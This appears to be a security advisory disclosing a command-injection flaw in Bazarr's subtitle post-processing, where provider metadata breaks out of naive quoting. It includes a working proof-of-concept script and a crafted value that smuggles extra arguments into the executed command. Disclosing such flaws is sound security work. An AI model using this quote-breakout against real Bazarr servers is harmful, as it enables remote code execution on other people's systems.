# Bazarr: post-processing command injection via provider metadata (Windows RCE, Linux argument injection)

## Description

`pp_replace()` in `bazarr/utilities/post_processing.py` (L12-30) substitutes `{{release_info}}`, `{{uploader}}`, and other placeholders in the admin-configured post-processing command template. The substitution wraps values with `_double_quotes()` (L12-13: `return f'"{in_str}"'`) — **naive quoting without escaping embedded double quotes**.

The executor in `bazarr/subtitles/post_processing.py` (L20-29):
- **Windows** (`os.name == 'nt'`): `subprocess.Popen(command, shell=True)` — the full command string goes to cmd.exe. A double quote in provider metadata breaks out of the quoting and injects **arbitrary shell commands**.
- **Linux**: `shlex.split(command)` + `shell=False` — prevents shell metacharacter injection (the comment at L20-22 explicitly states this is for CWE-78 avoidance), but the quote breakout still injects **arbitrary additional arguments** into the executed command.

The attacker-controlled input is subtitle provider metadata (`release_info` / `uploader` from the subtitle site the agent downloads from — a semi-trusted external source).

## Impact

On Windows deployments: arbitrary command execution with service privileges when a subtitle is downloaded from a provider whose metadata contains crafted quotes. On Linux: argument injection into the post-processing command (arbitrary flags, paths, or subcommands depending on what tool the admin configured). Triggered automatically when the subtitle download pipeline fires.

## PoC

```bash
cd <bazarr source directory>
python3 - << 'PYEOF'
import sys, types, importlib.util, json, os

# load the two product functions (settings stubbed to avoid the import chain)
app_mod = types.ModuleType("app"); cfg_mod = types.ModuleType("app.config")
class _S: pass
cfg_mod.settings = _S(); app_mod.config = cfg_mod
sys.modules["app"] = app_mod; sys.modules["app.config"] = cfg_mod
spec1 = importlib.util.spec_from_file_location("pp_util", "bazarr/utilities/post_processing.py")
m1 = importlib.util.module_from_spec(spec1); spec1.loader.exec_module(m1)
spec2 = importlib.util.spec_from_file_location("pp_sub", "bazarr/subtitles/post_processing.py")
m2 = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(m2)

# attacker: malicious subtitle provider sets release_info with embedded quotes
EVIL = 'x" --evil-injected-flag PWNED42 "y'
# victim admin's post-processing command template:
cmd = m1.pp_replace('python3 /tmp/pp_logger.py {{release_info}}', 
    episode='/tmp/media/movie.mkv', subtitles='/tmp/bazarr_victim/secret.srt',
    language='English', language_code2='en', language_code3='eng',
    episode_language='English', episode_language_code2='en', episode_language_code3='eng',
    score=100, subtitle_id='1', provider='evilsubsite', uploader='attacker',
    release_info=EVIL, series_id=1, episode_id=1)
print("rendered command:", cmd)
m2.postprocessing(cmd, '/tmp/bazarr_victim/secret.srt')  # product's own executor
print("argv executed:", json.load(open('/tmp/pp_argv.json')))
PYEOF
# /tmp/pp_logger.py: dumps sys.argv to /tmp/pp_argv.json
```

## Execution result

```
rendered command string: python3 /tmp/pp_logger.py "x" --evil-injected-flag PWNED42 "y"
argv actually executed: ['x', '--evil-injected-flag', 'PWNED42', 'y']
injected flag reached argv: True

# The double-quote in release_info broke out of _double_quotes() wrapping.
# Linux branch (verified above): injected arguments reach the executed command.
# Windows branch (code-verified, L23-25): subprocess.Popen(command, shell=True)
#   -> full shell command execution via the same quote breakout.
```
